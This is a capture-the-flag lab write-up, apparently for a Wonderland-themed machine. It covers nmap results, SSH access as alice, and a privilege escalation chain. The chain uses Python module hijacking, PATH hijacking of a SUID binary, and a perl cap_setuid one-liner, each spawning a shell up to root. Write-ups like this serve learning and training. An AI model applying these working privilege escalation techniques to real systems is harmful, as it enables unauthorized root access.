```nmap
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Got some directories
```
r/a/b/b/i/t
poem/
img
```

Got alice's credentials from the source 
### **Initial Access**

I began by establishing an SSH connection to the target machine as user **`alice`**:

```bash
ssh alice@10.48.137.121
```

Upon login, I enumerated my environment and confirmed I was operating as `uid=1001(alice)`. A quick inspection of my home directory revealed two notable files:

- `walrus_and_the_carpenter.py` (owned by **root**)
- `root.txt` (inaccessible at this stage)

Given that `walrus_and_the_carpenter.py` was not owned by me, I suspected it might be tied to privilege escalation.

---

### **Step 1: Horizontal Privilege Escalation – `alice` → `rabbit`**

I checked for custom sudo permissions using:

```bash
sudo -l
```

This returned the following rule:

```text
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script imports Python’s built-in `random` module:

```python
import random
...
line = random.choice(poem.split("\n"))
```

Recognizing an opportunity for **Python module hijacking**, I created a malicious `random.py` in `/home/alice/`:

```python
import os
os.system("/bin/bash")
```

I then executed the allowed command:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Because Python prioritizes the current working directory when resolving module imports, my local `random.py` was loaded instead of the standard library module. This dropped me into a shell as **`rabbit`**, achieving **horizontal privilege escalation**.

---

### **Step 2: Vertical Privilege Escalation – `rabbit` → `hatter`**

As `rabbit`, I inspected my home directory and found a custom binary:

```bash
-rwsr-sr-x 1 root root 16816 May 25 2020 teaParty
```

The binary had both `setuid` and `setgid` bits set—indicating it would run with the privileges of **root** and the **rabbit** group.

Running it yielded:

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 03 Dec 2025 03:09:42 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

After entering input (e.g., "Please"), it crashed with a **segmentation fault**. Using `ltrace`, or by intuition, I deduced it likely executed the system `date` command internally—without a full path.

To exploit this, I created a malicious `date` script in `/home/rabbit`:

```sh
#!/bin/sh
/bin/sh -i
```

Made it executable:

```bash
chmod +x /home/rabbit/date
```

And prepended its location to `PATH` before invoking the binary:

```bash
PATH=/home/rabbit:$PATH /home/rabbit/teaParty
```

The `teaParty` binary executed my `date` script with elevated privileges. However, instead of gaining a root shell, I was dropped into a shell as **`hatter`** (`uid=1003`). This indicated that the binary internally called `setuid(1003)`—still a successful **vertical escalation**, as I now had access to a new user context.

---

### **Step 3: Final Escalation – `hatter` → `root`**

As `hatter`, I checked `sudo -l`, which confirmed I had no sudo rights. Standard SUID binaries also offered no direct path to root.

However, while running enumeration scripts (including `linpeas.sh`), I discovered that **`/usr/bin/perl`** possessed a powerful capability:

```bash
getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep
```

The `cap_setuid+ep` capability allows a process to call `setuid(0)` and become root—even without the SUID bit.

I leveraged this with the following one-liner:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

This immediately spawned a **root shell**.

---

### **Conclusion**

My full privilege escalation path was:

1. **Horizontal**: `alice` → `rabbit` via **Python module hijacking**  
2. **Vertical**: `rabbit` → `hatter` via **PATH hijacking** on a SUID binary (`teaParty`)  
3. **Root**: `hatter` → `root` via **capability exploitation** (`cap_setuid+ep` on `perl`)

I then retrieved the root flag:

```bash
cat /root/root.txt
```

This compromise demonstrates how misconfigurations in scripting behavior, binary permissions, and Linux capabilities can chain together to achieve full system control.

---